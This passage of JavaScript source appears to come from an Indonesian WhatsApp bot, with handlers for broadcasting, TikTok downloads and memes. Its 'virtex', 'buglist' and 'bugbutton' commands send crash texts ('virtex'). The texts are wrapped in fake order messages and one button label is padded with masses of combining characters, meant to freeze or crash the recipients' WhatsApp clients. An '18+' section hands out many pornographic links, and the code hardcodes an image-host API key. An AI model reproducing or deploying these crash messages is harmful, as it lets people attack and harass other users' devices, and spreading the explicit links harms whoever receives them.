             Hanz.sendMessage(_.jid, bc, image, {quoted:ftrol,caption: `*『 Haris 』*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
Hanz.sendMessage(_.jid, 
			{"contentText": `*『 Haris Broadcast 💫 』*\n\n${body.slice(4)}`,
			"footerText": 'broadcast💫',
			"buttons": [
			{"buttonId": `#command`,
			"buttonText": {"displayText": "📙 MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break                               
             case 'bc':
case 'bcbut':
if (!isOwner && !mek.key.fromMe) return reply(`Hanya Untuk @${ownerNumbers.split("@")[0]}`)
if (args.length < 1) return reply('Teksnya?')
anu = await Hanz.chats.all()
for (let _ of anu) {
buttonss = [{buttonId: `${prefix}ucapan`, buttonText: {displayText: 'UCAPAN'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'OWNER'}, type: 1}]
var btnbc = {
contentText: `${q}`,
footerText: '*HANZ々OFC彡*',
buttons: buttonss,
headerType: 1
}
await Hanz.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
}
reply(`Sukses Mengirim Broadcast:\n${q}`)
break
//~~~~~~~~~~~~~~~~~~~~~[RANDOM AE KONTOL]~~~~~~~~~~~~~~~~~~~~~//
case 'ttaudio': 
      case 'tiktokmusic': 
      case 'tiktokaudio':
              reply(mess.wait)
             if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
             ini_link = args[0]
             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${Hanzkey}&url=${ini_link}`)
             Hanz.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
             break			
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await Hanz.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						Hanz.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await Hanz.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						Hanz.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break           
		  case 'tiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_url = args[0]
ini_url = `https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${ini_url}`
get_result = await fetchJson(ini_url)
ini_buffer = await getBuffer(get_result.result.link)
await Hanz.sendMessage(from, ini_buffer, video, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
//~~~~~~~~~~~~~~~~~~~~~[18+ AREA]~~~~~~~~~~~~~~~~~~~~~//
//LINK BOKEP DI BAWAH NYA
case 'kodekeras':
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `📸YAH SUKA 2D 📸
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
Note : EASY MODE = Sange, Biasa Aja, Mental Lemah :v
==============================
MEDIUM MODE = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
HARD MODE = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "HANZ々OFC彡",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - EASY MODE
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MEDIUM MODE -
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - HARD MODE -
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/

══{*BONUS COK*}══
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ftrol})
Hanz.relayWAMessage(res)
break
case 'smeme':
pe = args.join('')
            top = pe.split('|')[0]
            bottom = pe.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  Hanz.downloadAndSaveMediaMessage(ger)
anu = await imgbb("20a14861e4f7591f3dc52649cb07ae02", owgi)
tekks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break
				case 'darkjokes':
reply(`Wait bwang...`)
anu = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`, {method: 'get'})
tekss = `Wow Lucu Banget😱`
trans = `${footertext}`
but = [
          { buttonId: `${prefix}darkjokes`, buttonText: { displayText: '🔖 Next' }, type: 1 },
          { buttonId: `${prefix}donasi`, buttonText: { displayText: '💰 Donasi' }, type: 1 }
        ]
        sendButImage(from, tekss, trans, buff, but)
break
case 'linkbokep':
                novpn = `[ *API SC* ]\n`
                    novpn += `➻ *NO VPN1* : bit.ly/2Qn9Qgu\n`
                    novpn += `➻ *NO VPN2* : bit.ly/3gWaBt8\n`
                    novpn += `➻ *XNXX VPN* : bit.ly/3vJZJ7n\n`
                    reply(novpn)
                    break
case 'bokep1':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break          
case 'bokep2':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break  
case 'bokep3':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep4':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep5':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep6':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break      
case 'bokep7':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep8':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep9':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep10':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep11':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep12':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep13':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep14':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break
case 'bokep15':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸
*NIH BAHAN COLI BUAT KALIAN :v*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'GW SANGE DAN AKU BANGGA🗿' }, type: 1 }])
break             
			
//~~~~~~~~~~~~~~~~~~~~~[BUGBOT RASA CACING]~~~~~~~~~~~~~~~~~~~~~//
//PENETRAL KALO ADA BUG TINGGAL KETIK INI
//BIAR VIRUS NYA KEPENDAM
case 'penetral':
reply(`${penawarbug}`)
break
//SEBENAR NYA INI GK GUNA SUMPAH
//TAPI GW GABUT 
case 'virtex':
 if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
  Hanz.sendMessage(from, virtexbytsukasa(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})                 
  Hanz.sendMessage(from, virtex6(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, hanz(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, api(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
                  Hanz.sendMessage(from, virtex2(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, trava(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 Hanz.sendMessage(from, virtex3(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.toggleDisappearingMessages(from,`AaaaGoblok`,text)
                  Hanz.sendMessage(from, virtex4(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
                  Hanz.sendMessage(from, virtex5(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
 Hanz.sendMessage(from, virtex6(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.sendMessage(from, virtex7(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.sendMessage(from, virtex7(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
  Hanz.sendMessage(from, 9(prefix),text, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
   Hanz.sendMessage(from, ngazap(prefix),extendedText, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1, 
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: fake, 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }}) 
 break
case 'buglist':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')   
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'HANZ々OFC彡',
"description": `𝔅𝔘𝔊𝔏ℑ𝔖𝔗
▬▭▬▭▬▭▬▭▬▬▭▬▭
BY: HANZ々OFC彡

◦➛YT https://youtube.com/HANZ々OFC彡
▬▭▬▭▬▭▬▭▬▬▭▬▭
${ngazap(prefix)}`,
"buttonText": `⏤͟͟͞͞JEMBOD😈😈😈😈😈😈😈${ngazap(prefix)}`,
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
    "rows": [ 
       {
           "title": virtex2(prefix),
           "rowId": "Kontol"
           
           },
	       {
           "title": virtex7(prefix),
           "rowId": "Kontolodon"
           },
	       {
           "title": virtex9(prefix),
           "rowId": "Jembot"	       
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
//BUG BUTTON + VIRGAM
  case 'bugbutton':
  if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
  await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
					let contentd = fs.readFileSync('./media/thumnail.jpg')
					let mdia = await Hanz.prepareMessageMedia(contentd, MessageType.image, {thumbnail: fs.readFileSync('./media/virgam.jpeg')})
					let taip = 4;
					let buttons = [
					{buttonId: 'id1', buttonText: {displayText: `${virtex2(prefix)}${virtex7(prefix)}${virtex9(prefix)}${virtex7(prefix)}${virtex9(prefix)}${ngazap(prefix)}ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ᷽̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈־᷽־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ